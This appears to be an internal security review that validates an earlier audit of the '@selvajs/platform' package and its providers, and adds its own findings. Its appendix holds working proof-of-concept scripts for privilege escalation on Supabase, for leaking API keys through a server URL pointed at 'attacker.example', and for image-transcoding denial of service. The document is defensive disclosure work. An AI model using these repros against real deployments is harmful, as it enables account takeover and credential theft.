# `@selvajs/platform` review: validation

Checks [platform-review-audit](./platform-review-audit.md) against the tree, then reviews the
package and its providers independently. **Tracked in:** unfiled.

## How this was checked

Each of the review's 80 findings got a verdict: 53 confirmed, 25 partly, 2 wrong. The independent
pass added 26 findings it missed. The most serious ones are in the Supabase migrations, not in
`packages/platform`, because the interfaces there only promise what RLS and grants must deliver.

- **Baseline, on `beta` at `2cc811b9`:** `type-check`, `test` (39 passing) and `build` pass. `lint`
  gives one warning (K4). Local conformance gives 225 passed, 2 skipped. All 13 Supabase
  conformance files skip without a live stack.
- **Local provider findings** ran the real stores and handlers from `dist`.
- **Supabase findings** applied every real migration to PGlite (a real Postgres engine) with
  Supabase's roles and `auth.uid()` stubbed, then replayed each request the way PostgREST does: one
  transaction, `set local role`, JWT claims. Every store call was traced to confirm the statement
  and the role.
- **Second look:** each new finding was rerun by a second agent from its script. The
  anon-privilege finding was also rerun by hand.
- **Mechanical rows:** every WRONG and PARTLY was reconfirmed with `rg` or by opening the file, and a
  sample of the rest held. L2 was a mechanical CONFIRMED that turned out wrong:
  `solve-result-cache-seam.test.ts` contains NUL bytes, so `rg` treats it as binary and skips it.
  It is the only tracked text file with NULs, so the `P1`, `P2` and `L2` symbol counts were redone
  with `rg -a` rather than rerunning that whole slice.
- No row was judged from names or line counts alone.

**Not verified:**

- A live Supabase stack, hosted Supabase, PostgREST or GoTrue. The replays cannot show gateway
  behaviour, and no deployed instance was touched, so nothing here says any instance was exploited.
- Email uniqueness on Supabase in the invite race (B16), which depends on GoTrue.
- Windows path behaviour. All runs were on macOS, so that part is reasoning.
- A real two-version install for the `ProviderError` finding, and the bundle saving from
  `sideEffects: false` (measured once, not rebuilt on rerun).
- Whether `timeoutMs` on a compute server is read at all (D4).

## Corrections

### Wrong

- **L2.** The claim that the solve-cache seam has no code user is false.
  `packages/solve/src/server/__tests__/solve-result-cache-seam.test.ts` builds a real backend against
  it on purpose. `plans/archive/caching-simplification.md` keeps both the seam and `solveCacheLimit`,
  and `plans/features/presolve-bundle.md` and `mcp-next.md` rely on `solveCacheLimit === 0`. The
  column is persisted, so removal needs a migration too. Drop L2. Its one true part: there is no
  production implementation.
- **L4.** `auditSoftDelete` is also used by `providers/supabase/src/data/rowStamp.ts:2,25`, so moving
  `utils/audit.ts` into the local provider would break Supabase. Only `auditUpdate` is local-only.
  Drop the move and fix the module header.

### Partly right

- **B5.** The trailing hyphen is real. `''` is guarded at the org callers, but
  `server/src/handlers/projects.ts:245` and `selva/src/routes/api/admin/projects/[id]/+server.ts:47`
  assign `slugify(name)` with no guard, so a renamed project can get an empty slug.
- **B7.** The drift and the ADR claim are real, but a reserved org slug breaks nothing today: no
  `/o/` route exists and slugs are only displayed. It becomes a bug when org URLs ship.
- **B8.** Only `COVER_IMAGE_EXTENSIONS`-driven classification narrows. The constant also feeds
  `ALLOWED_UPLOAD_EXTENSIONS`, so change the pattern, not the constant. No non-WebP cover can exist.
- **B11.** `application/pdf` named `x.png` does throw, but no real caller sends that mismatch.
  `bucketFor` is fail-open and no in-tree writer hits it today. Paths that would reach the public
  bucket: `orgs/acme/private/2026/quote.pdf`, `definitions/<guid>/versions/v1.gh.bak`,
  `definitions/<guid>/assets/part.3dm`.
- **B16.** The double account is real on local but has a different cause: `createUser` awaits
  `hashPassword` between its uniqueness check and the push. Ignoring `markAccepted` is not the cause,
  and Supabase's `markAccepted` is already conditional. Reproduced 12 of 12 on local: two accounts,
  two memberships. On header-auth the loser gets a 400 with a raw `ENOENT`.
- **C7.** "About a minute" is the provider default (`DEFAULT_TTL_SECONDS = 60`), which the app
  overrides. Reword to "default 60 s, set by `ttlSeconds`".
- **C12.** `events/audit.ts` has no limit constants; only `SupabaseAuditQuery.ts:11-12` declares them.
  No real caller sends a fractional limit.
- **D3.** Calling `resolveServerForOrg` from the page would drop servers: it refilters with a null
  org, and the loader already filtered. Extract a pure `pickServer(visible, defaultId, pin)` instead.
- **D5.** The duplication is real and the two encode the same offsets. `parseListOptions` always
  yields a finite limit, so `NaN` cannot arrive over HTTP.
- **D6.** Local's `MAX_RECENT_RUNS` is in `local/src/data/userData.ts:26`. Neither the cap nor the
  access rule has a test: add those before sharing the code.
- **D8.** The count is 339 root imports to 49 subpath imports, not 335 to 20. See the proposal notes
  below.
- **L3.** Nothing writes `orgs/{id}/private/*`, but the files route does serve it through the `org`
  branch. The external consumer does not use it either. Removing the class before B11 is fixed sends
  that path to the public bucket.
- **P3.** No code imports the eight "docs only" subpaths, but code comments name some of them.
- **K1.** The real count is 176 of 355 files. `../../src` holds for nested maps, and root maps point
  at `../src`.
- **T2.** The suite covers 11 of 33 event types, not 9.
- **T3.** `IProxyAuth`, `IDelegatedSession`, `touchLastLogin` and session revoke are tested outside
  the suite. `registerUser`, `IOAuthAuth` and `verifyLogin` after `disableUser` have no test.
- **T6.** No conformance suite exists for any of the five, but four have implementation tests. Only
  `IBindingResolver` has none.
- **T7.** No suite races it, but both providers have concurrency tests. Local's only asserts "does
  not throw", and its class comment admits the cap overshoots.
- **T16.** Keep the test. A structural type allows extra fields, so it catches an adapter returning a
  raw row. Only its history comment should go.
- **T20.** The loop is vacuous and the header pointers should go. The rest of the file holds real
  format tests.
- **T21.** `ctx` is identical, but `recordTokensFromScope` has no helper equivalent and the suites'
  `tokens` Map is module-wide. A swap needs one `makeSeedHelpers` per suite.
- **T22.** Ten sites, not nine. `solveMetricSinkSuite` varies `userId`.
- **T23.** The `upload` verb is not in the table, so fold the rows in rather than deleting them.
- **N1.** `auth/interface.ts:83-88` is a valid `@deprecated` notice and only its "next minor" phrase
  rots. `definitions/types.ts:169` is a design term, not a pointer. The other eight stand.
- **N2.** `platformPermissionStoreSuite.ts:166-168` and `definitionStoreSuite.ts:391-402` hold a
  current why. Keep the reason and drop the "used to".

### "Checked and found clean" was too generous

`canSolve`, `canReclaim`, `canCreateProject`, `canChangeOrgRole`, `checkOwnerRemoval`,
`apiTokens/scope.ts`, `encryptSecret`, `decryptSecret`, API-token parity and the packaging rows held.
`canView`, `canManage`, `canEdit` and `canEditDefinition` did not: see M4 and X2 below.

### Proposals that need changing

- **D8.** `export *` from `./computeServer/index.js` would pull `node:crypto` into the root barrel.
  Split out a browser-safe `public.ts` and export that. Files with no area index (`context.ts`,
  `pagination.ts`, `config.ts`, `errors/`, `logging/`, `metrics/`, `bindings/`, `solveCache/`) keep
  explicit exports. There are no name collisions.
- **P1.** Most of the list has an internal use, so "remove" means "unexport". Only `orgServersFor`,
  `isPublicAssetPath` and `ALLOWED_UPLOAD_EXTENSIONS` are truly dead. `ApiTokenRevokeReasonSchema`
  derives a live type, so L1 needs the same change.
- **B10 and the `markAccepted` half of B16.** Changing a return type on an implemented interface
  breaks every implementer of `IStorageProvider` or `IInviteStore`. These need a major bump or a new
  method.
- **B16 fix.** Claiming first would burn the invite when account creation fails, against the recovery
  order the action relies on (`accept-invite/+page.server.ts:131`). Hash before the uniqueness check
  in `createUser`, and lock local `markAccepted` and header-auth `createUser`. Supabase needs nothing.
- **B1 fix.** Sound. Run against the suites it failed one test, a fixture where an orgless user
  uploads with the flag off. It needs the "any authenticated" wording changed in `permissions.md`.
- **C8.** `.default()` makes `CreateShareLinkInput.maxSolves` required, a type-level change, and
  `harness.ts:313` keeps its own default because it skips the schema.
- **D1, D5, D6.** Cursor helpers belong in `pagination.ts`. The assert helpers encode provider policy,
  so keep them out of the public `.d.ts` unless they are labelled for provider authors.
- **T9.** Keep `runAuthProviderConformance` as a capability-gated wrapper over new exports. New cases
  should be opt-in so third-party adapters do not go red.
- **K1.** Override `sourceMap` in `packages/platform/tsconfig.json`. `tsconfig.node.json` is shared by
  eight packages.
- **Order.** B2 before D1. B12 before D7 before B8. B11 before L3. B10 and T17 together: decide
  first whether rewriting to WebP is a contract or a provider choice.

## Confirmed findings

**Bugs in platform logic:** B1, B2, B3, B4, B6, B9, B10, B12, B13, B14. B1 is more serious than
written: `PATCH /definitions/{guid}` with a foreign `projectId` moves a definition across orgs the same
way, and with the flag off the uploader then gets 404 on their own upload. Supabase's insert policy
admits the same case. The outsider needs the project UUID, so a departed member is the realistic
actor. B9 and B10 are latent: no caller reaches them today.

**Bugs in providers and consumers:** B15, B17, B18, B19. B15 reproduced: 20 increments against
`maxSolves=5` all admitted, 12 concurrent `create` calls left 3 links. B18 also clears
`orgDefaults` on success, through the FK. B19 changes nothing for bundled providers.

**Interface contracts:** C1, C2, C3, C4, C5, C6, C8, C9, C10, C11. C4: `getById` is unfiltered, so
"reads filter" never covered it. C10: the README's "retry re-deletes blobs" is also wrong.

**Duplication:** D1, D2, D4, D7. D4's clamp exists only in the admin page; the server does not
validate `timeoutMs`.

**Logic:** L1, L5, L6.

**Public API:** P1 (no user in this repo or the external consumer), P2, P4.

**Package and config:** K2, K3, K4.

**Tests:** T1, T4, T5, T8, T9, T10, T11, T12, T13, T14, T15, T17, T18, T19. T1's rules are covered
outside the suite, by the encryption and org-scoping tests.

**Comments and docs:** N3, N4. Covers do go stale: `saveCoverImage` overwrites one URL with no cache
bust, on a one-year `cacheControl`.

## New findings the review missed

### High

- **H1. Anonymous callers can make themselves instance admin on Supabase.** `reproduced`
  `20260425155514_selva_initial.sql:18` gives `anon` and `authenticated` explicit EXECUTE on every
  `selva` function by default. `revoke ... from public` does not remove that, so the ACL reads
  `anon=X/postgres`. As `anon`, `set_platform_permissions` promoted a user and then demoted the real
  admin. `claim_first_instance_admin` has the same ACL, and `redact_audit_event_email` rewrote audit
  rows. The migration comments say "service-role only", and `selva` is exposed through PostgREST.
  Selva keeps `SUPABASE_ANON_KEY` server-side, which limits the exposure, but Supabase treats it as a
  publishable key, so it is not a boundary. Fix: a migration that revokes EXECUTE from `anon` and
  `authenticated` on every privileged function, drops `functions` from the default privileges, and a
  test asserting `has_function_privilege`.
- **H2. Removing an org member leaves their project access intact on Supabase.** `reproduced`
  `SupabaseOrgStore.ts:397-413` runs the cascade under the acting admin's JWT
  (`client.ts:89`). RLS hides private projects from that admin, so the cascade touches 0 rows without
  an error and `org_members` is removed anyway. The leaver then read and edited a private definition
  and minted a share link. Reclaim 404s for the same reason. Fix: a SECURITY DEFINER RPC or the
  service client, failing on zero rows, with reclaim loading as SYSTEM and then checking tenancy.
- **H3. Erasing one user can delete a whole tenant, or be refused.** `reproduced`
  `orgs.owner_id on delete cascade` took the org, projects, definitions, versions, members and tokens
  to zero, even after the founder had left and a colleague owned the org. `ownerId` is documented as
  transferable, but no store writes it. A project creator's erasure deletes a shared project. An
  uploader of someone else's live version cannot be erased (23503). This matters for the operator's
  erasure duties. Fix: `set null` on owner and uploader columns, plus reassignment or a pre-flight
  refusal in the delete route.
- **H4. RLS is wider than `rules.ts`.** `reproduced` With a session JWT and the anon key, an org admin
  PATCHed their own pending invite to `platform_permissions={instance_admin}`, which
  `accept-invite/+page.server.ts:143-152` then applies through `SYSTEM_CONTEXT`. An admin self-promoted
  to owner. A removed creator reactivated their owner row. A departed commons uploader edited a
  definition. Any user read every `user_profiles` row. A token session for org A wrote org B rows. The
  session cookie is `httpOnly`, but a user can sign in to GoTrue directly once they hold the URL and
  key. Fix: column grants on invite updates, `canChangeOrgRole` mirrored in policy, membership tests,
  shared-org scoping on profiles, and helpers pinned to `delegated_org()`.
- **H5. Stored ciphertext can be replayed to decrypt an API key.** `reproduced`
  `encryptApiKeys` passes through any `enc:v1:` value (`LocalComputeServerStore.ts:174`,
  `SupabaseComputeServerStore.ts:251`) and no wire check blocks it. With
  `ALLOW_ORG_COMPUTE_OVERRIDE`, org A pointed another org's and the platform's ciphertext at
  `http://attacker.example`, and `getServerApiKey` returned both plaintexts for those rows. On Supabase
  a non-member can `select api_key` on a shared platform server, so no backup leak is needed. Fix:
  reject the prefix on the wire, encrypt unconditionally, use the server id as AAD, and revoke the
  column from `authenticated`.
- **H6. Compute saves destroy keys and defaults.** `reproduced` Extends B18. `id: "prod-1"`,
  `timeoutMs: 3e9` and a colliding id all pass validation, fail the insert after the delete, and leave
  0 servers with keys gone. An identical re-save clears `orgDefaults`. `orgCompute.ts:90` claims a
  duplicate-id check that does not exist. On local, saving with `apiKey` omitted under a wrong
  `SELVA_AT_REST_KEY` overwrites the ciphertext for good, despite the log's advice to restore the key.
  Fix: a transactional RPC or upsert, `z.uuid()` and bounded integers, and refusing the save when a
  stored key failed to decrypt.
- **H7. Last-admin and last-owner guards race.** `reproduced` on local, Supabase read-only. Two admins
  deleting each other both get 204, `hasInstanceAdmin` goes false, and `/setup` reopens. Two project
  owners demoting each other leave zero owners, 10 of 10, because `updateProjectMemberRole` lacks the
  org side's `serializeOwnerChanges`. Fix: an atomic delete guard, and serialize project owner changes.
- **H8. Local stores lose revocations.** `reproduced` Extends B15. `revokePendingByEmail` returned with
  the invite still redeemable 195 of 200 times, and the real offboarding handler calls it. A grant
  revocation came back 28 of 50 times. 20 concurrent grant creates persisted 1 row, all reporting
  success. Two orgs saving compute at once lost one org's servers 50 of 50. These rounds force
  overlap, so they are not field rates. The queued API-token store lost 0 of 50. Fix: move
  `LocalApiTokenStore.locked` into `fsJson` and use it in every read-modify-write store.
- **H9. Image transcoding has no limits.** `reproduced` `storage/image.ts:51` sets no
  `limitInputPixels` or timeout. A 177 KB GIF peaked at 1.34 GB RSS and a 12.7 KB SVG took 9 s. Any
  definition editor reaches this: the route checks the client-declared `file.type`, so SVG declared as
  PNG passes, and the 10 MB cap does not help. Fix: `limitInputPixels`, `.timeout()`, a concurrency
  cap, and a format allowlist from `metadata()`.
- **H10. Saving an untagged definition fails on Supabase.** `reproduced` to the 23502.
  `DefinitionEditDrawer.svelte:181` sends `tags: null`, nothing converts it, and the column is
  `text[] not null`. `mapPostgrestError` does not map 23502, so it should surface as a 500 (handler
  path read, not run). Local accepts it, and no suite covers tags. Fix: `row.tags = patch.tags ?? []`
  and a conformance case.

### Medium

- **M1. Local erasure and org delete leave personal data.** `reproduced` Extends B17. After erasure
  the email stays in `invites.json` and a pending owner invite still resolves. The user id stays in
  `local-org.json`, `definitions-config.json`, grants and share links. `LocalDataProvider.ts:95-114`
  ignores the email. Fix: delete invites by email and clear user references.
- **M2. Share-link roster and revoke misreport on Supabase.** `reproduced` The roster policy's subquery
  runs under `definitions` RLS, so an owner saw 1 of 2 links, hiding the private-project links
  offboarding needs. A commons uploader's revoke matches 0 rows, and the store still emits the event.
  `revokeAllForUser` no-ops only for an operator with neither `instance_admin` nor a member-management
  grant on that org. Fix: a SECURITY DEFINER roster, a commons branch, and failing on zero rows.
- **M3. Blobs outlive their owners.** `reproduced` After `deleteOrg` the logo is still served, and a
  logo can be personal data. Project delete wipes no blobs and `orgPaths.prefix` has no callers.
  `listAllKeys` has no offset, so 2500 versions left 1500 blobs behind (measured with a fake client
  that honours `offset`). Fix: wipe in the org and project delete services, and page `list()`.
- **M4. Access rules disagree with reclaim and the platform flag.** `reproduced` An outside
  `instance_admin` reclaims an `org` project and gets owner, then view 403 and edit ok, though
  `permissions.md:47,316` promise content access. With `ENABLE_PLATFORM_PROJECTS` off,
  `managementBypassOrRun` still allowed PATCH and DELETE on a platform project.
- **M5. A disabled admin can leave zero enabled admins.** `reproduced` C1's impact is narrow: disable
  revokes first, so the normal path is safe. But `PATCH /api/admin/users/[id]` grants `instance_admin`
  to a disabled user, after which the last enabled admin can go, `/setup` stays closed, and no enable
  endpoint exists. Fix: refuse that grant in `instanceAdmins.server.ts`.
- **M6. Accepting an invite replaces existing platform permissions.** `reproduced`
  `accept-invite/+page.server.ts:143` turned `['manage_updates','manage_compute']` into
  `['manage_instance_users']`. The `alreadyMember` guard covers only the org role. Fix: merge.
- **M7. Stored images disagree with the docs.** `reproduced` EXIF orientation is dropped, not applied.
  2400x30000 stores as 1200x15000, since "capped at 1200px" bounds width only. 100x60000 throws. SVG
  keeps its intrinsic size against `org-asset-service.ts:13`. Corrupt input returns 500. Fix:
  `.autoOrient()`, `fit: 'inside'`, and `ProviderError(422)`.
- **M8. Local writes are not durable.** `reproduced` A failed write stays in the cache and is served.
  A rejected `loading` promise wedges the store after the file is repaired. Overlapping writes let an
  older snapshot win 400 of 400. `put` overwrites in place, so concurrent reads came back short. The
  storage root is `DATA_PATH`, so `get('auth-users.json')` returns the credential file. `/api/files`
  blocks that with its class registry, and nothing at the storage layer does.
- **M9. The solve-metric cap fails when the backend stalls.** `reproduced` with a fake client. 1M
  records against a hung insert retained 187 MB with no drop log, since `flush` moves rows out of the
  capped buffer. A clean exit lost 99 of 99 rows. The missing dispose seam is already O7 in the
  [data-access audit](./data-access-efficiency-audit.md); the cap is new.
- **M10. The root barrel is unsafe to bundle.** `reproduced` esbuild's browser build fails on `sharp`,
  and with no `sideEffects` field one constant costs 92.6 KB in Vite. `instanceof ProviderError` is
  false across two installed copies, which would turn a 403 into a 500, and providers take platform as
  a dependency, so a prerelease mismatch can produce two copies. Fix: `"sideEffects": false`, a
  non-static `sharp` specifier, and a `Symbol.for` brand check.
- **M11. Recipient emails reach stdout.** `read-only` `smtp-provider.ts:58-63` logs `to` and raw
  `err.message` on failure, which erasure cannot reach. Its comment says this is deliberate. Fix: log a
  message id or keyed hash.

### Low

- **X1.** `decodeSecretKey` accepts junk-padded input and a 43-char passphrase, despite "Throws on
  anything else". `reproduced`
- **X2.** `canEdit`, `canManage`, `canEditProjectSettings` return true for `project: null` with an
  owner row, and `canEditDefinition` does not compare `definition.projectId`. Current callers are
  safe. `reproduced`
- **X3.** `canView` skips the `actingOrgId` check `permissions.md:327` requires. `read-only`
- **X4.** `solve-result-cache-seam.test.ts` says platform has no test runner, which is false. Its NUL
  separators make `rg` skip the file: write `\0` as an escape. `read-only`
- **X5.** `IUserProfileStore` says adapters must scope by `ctx`, while both `getProfiles` are unscoped
  by design. `read-only`

## Decisions for a human

- **H1 first?** Recommendation: yes, ahead of everything else, as its own migration, and check every
  live Supabase deployment's function ACLs and `user_profiles.platform_permissions`.
- **Should a commons project accept uploads from outside the org with the flag off (B1)?** The docs
  contradict themselves. Recommendation: no. Apply the fix and update `permissions.md`.
- **Is the direct-REST surface in scope (H4)?** Migration §11 treats it so, while Selva keeps the key
  server-side. Recommendation: treat RLS as the boundary, since Supabase documents the key as public.
- **Is rewriting to WebP part of the `put` contract (B10, T17)?** Recommendation: yes. Document it, then
  return the final path at the next major.
- **Do you want `ctxIsolation` on in Supabase tests (T19) or deleted?** Recommendation: on, and add a CI
  job with a live stack, since all 13 Supabase conformance files skip without one.
- **Unexport the P1 symbols?** Recommendation: only in the next major, with one added, unexported and
  removed table, since D4 and D5 add exports in the same release.

## Appendix: repro scripts

`lib.mjs` wires the real local stack from `dist`. `pg` is the PGlite harness: every file in
`supabase/migrations` applied in order, after creating `anon`, `authenticated`, `service_role`, and
stubbed `auth.users`, `auth.jwt()`, `auth.uid()`. `as(db, who, sql, params)` runs one transaction with
`set_config('request.jwt.claims', …)` and `set local role`; `{}` means `anon`.

**H1**

```js
const db = await freshDb();
const nobody = await user(db, 'nobody@evil.io');
const admin = await user(db, 'admin@acme.io');
await db.query(
	`update selva.user_profiles set platform_permissions='{instance_admin}' where user_id=$1`,
	[admin]
);
await as(db, {}, `select selva.set_platform_permissions($1, '{instance_admin}')`, [nobody]); // 1
await as(db, { sub: nobody }, `select selva.is_instance_admin()`); // true
await as(db, {}, `select selva.set_platform_permissions($1, '{}')`, [admin]); // 1
```

**H2**

```js
const a = (sql, params) => as(db, { sub: admin }, sql, params);
const seen = await a(`select id from selva.projects where org_id=$1`, [acme]); // no private-p
const ids = seen.rows.map((r) => r.id);
const leave = `set deleted_at=now() where user_id=$2 and deleted_at is null`;
await a(`update selva.project_members ${leave} and project_id=any($1)`, [ids, leaver]);
await a(`update selva.org_members ${leave} and org_id=$1`, [acme, leaver]); // 1 row
const edit = `update selva.definitions set display_name='after' where guid=$1 returning guid`;
await as(db, { sub: leaver }, edit, [d.guid]); // edits the private definition
```

**H3**

```js
const acme = await org(db, founder, 'acme');
await member(db, acme, colleague, 'owner', ['manage_org_members']);
const p = await project(db, acme, colleague, 'colleague-project');
await definition(db, p, colleague);
await db.query(`update selva.org_members set deleted_at=now() where org_id=$1 and user_id=$2`, [
	acme,
	founder
]);
await db.query(`delete from auth.users where id=$1`, [founder]);
// selva.orgs, projects, definitions, definition_versions, org_members: all 0
```

**H4 (invite step)**

```js
await db.query(
	`insert into selva.invites(id,token_hash,email,org_id,org_role,org_permissions,invited_by,expires_at)
  values ($1,'hash-a','alt@evil.io',$2,'member','{}',$3,now()+interval '7 days')`,
	[invite, acme, admin]
);
await as(
	db,
	{ sub: admin },
	`update selva.invites set platform_permissions='{instance_admin}', org_role='owner' where id=$1 returning platform_permissions, org_role`,
	[invite]
);
```

**H5**

```js
const disk = JSON.parse(await readFile(join(h.root, 'compute.config.json'), 'utf8'));
const apiKey = disk.servers.find((s) => s.id === 'b-srv').apiKey; // ciphertext only
const server = { id: 'evil', label: 'x', serverUrl: 'http://attacker.example', apiKey };
const locals = await actAs(h, attacker.id);
const params = { orgId: orgA.id };
const body = { servers: [server] };
await callHandler(handlers.updateOrgCompute, { locals, method: 'PATCH', params, body }); // 204
await store.getServerApiKey(locals.ctx, 'evil'); // ORG-B-RHINO-KEY
```

**H7**

```js
// Under vitest. DELETE is the route module selva/src/routes/api/admin/users/[id]/+server.ts.
const rs = await Promise.all([
	call(DELETE, { locals: la, params: { id: bob.id } }),
	call(DELETE, { locals: lb, params: { id: alice.id } })
]); // [204, 204]
await tp.config.data.permissions.hasInstanceAdmin(SYSTEM_CONTEXT); // false
```

**H8**

```js
await invites.create(S, a); // leaver@x.io
await Promise.all([
	invites.revokePendingByEmail(S, org, 'leaver@x.io'),
	invites.create(S, inv('other@x.io'))
]);
(await invites.listByOrg(S, org, { limit: 50 })).items.some((x) => x.id === a.id); // true, 195/200
await tokens.create(S, row);
await Promise.all([tokens.touchLastUsed(S, id, now), tokens.revoke(S, id, 'owner')]);
(await tokens.get(S, id)).revokedAt; // set, 50/50 (control)
```

**H9**

```js
const rects = Array.from(
	{ length: 200 },
	(_, i) => `<rect width="8000" height="8000" fill="#${(i % 9) + 1}00" filter="url(#f)"/>`
).join('');
const blur = `<svg xmlns="http://www.w3.org/2000/svg" width="8000" height="8000">
  <filter id="f" x="0" y="0" width="1" height="1"><feGaussianBlur stdDeviation="500"/></filter>${rects}</svg>`;
const bytes = new Uint8Array(Buffer.from(blur));
await transcodeImageIfNeeded(bytes, 'image/svg+xml', 'orgs/o/branding/logo.svg'); // about 9 s
```

**H10**

```js
await db.exec(`set session_replication_role=replica;
  insert into selva.definitions (guid,project_id,owner_id,display_name,status) values ('${id}','${id}','${id}','x','draft')`);
await db.query(`update selva.definitions set tags=$1 where guid=$2`, [null, id]); // 23502
```

**B1**

```js
const dave = await actAs(h, outsider.id);
const body = new FormData();
body.set('file', new File([new Uint8Array([1, 2, 3])], 't.gh'), 't.gh');
body.set('displayName', 'outsider upload');
body.set('projectId', commonsProject.id);
await callHandler(createDefinition, { locals: dave, url, body }); // 201 with ALLOW_CROSS_ORG_PUBLIC off
```

**B15**

```js
const l = link({ maxSolves: 5 });
await store.create(S, l);
const r = await Promise.all(
	Array.from({ length: 20 }, () => store.tryIncrementSolveCount(S, l.id))
);
r.filter(Boolean).length; // 20
(await store.getById(S, l.id)).solveCount; // 1
```

**B17**

```js
await orgs.deleteOrg(S, org.id);
await projects.getProject(S, p.id); // null
await definitions.get(S, guid); // live, deletedAt null
```

**M6**

```js
// Under vitest. mintInvite and actions are the real route modules; submit posts the form.
const u = await seedUser(tp, INVITEE, ['manage_updates', 'manage_compute']);
const res = await call(mintInvite, {
	locals: await actAs(tp, alice.id),
	params: { orgId: acme.id },
	body: { email: INVITEE, orgRole: 'member', permissions: ['manage_instance_users'] }
});
const token = new URL(res.json.acceptUrl).searchParams.get('token');
await submit(token, {}, { user: (await actAs(tp, u.id)).user });
await tp.config.data.permissions.getFor(SYSTEM_CONTEXT, u.id); // ['manage_instance_users']
```
